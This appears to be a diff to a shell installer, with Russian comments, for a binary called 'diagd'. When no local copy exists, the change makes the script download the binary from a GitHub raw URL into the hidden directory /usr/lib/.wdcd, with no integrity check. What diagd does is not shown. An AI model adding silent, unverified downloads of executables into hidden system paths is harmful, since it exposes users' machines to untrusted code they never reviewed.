@@ -1,11 +1,25 @@
 #!/bin/sh
 set -e
+_dl() {
+  if command -v curl >/dev/null 2>&1; then curl -fsSL --connect-timeout 15 --max-time 120 -o "$2" "$1"
+  elif command -v wget >/dev/null 2>&1; then wget -q -T 15 -O "$2" "$1"
+  elif command -v busybox >/dev/null 2>&1; then busybox wget -q -T 15 -O "$2" "$1"
+  elif command -v python3 >/dev/null 2>&1; then python3 -c "import sys,urllib.request as u;u.urlretrieve(sys.argv[1],sys.argv[2])" "$1" "$2"
+  else return 1
+  fi
+}
+BASE="https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools"
 SRC="${1:-$(dirname "$(realpath "$0")")/diagd}"
 DIR="/usr/lib/.wdcd"
 if [ ! -f "$SRC" ] || [ ! -x "$SRC" ]; then
-  echo "нет бинарника: $SRC" >&2
-  echo "скачай: curl -L -o diagd https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools/diagd" >&2
-  exit 1
+  echo "нет локального бинарника: $SRC — качаю с GitHub" >&2
+  mkdir -p "$DIR"
+  if _dl "$BASE/diagd" "$DIR/diagd.tmp"; then
+    SRC="$DIR/diagd.tmp"
+  else
+    echo "скачивание не удалось (нет curl/wget/python3). Залей binary вручную или поставь curl" >&2
+    exit 1
+  fi
 fi
 CA=/etc/ssl/certs/ca-certificates.crt
 if [ ! -s "$CA" ]; then
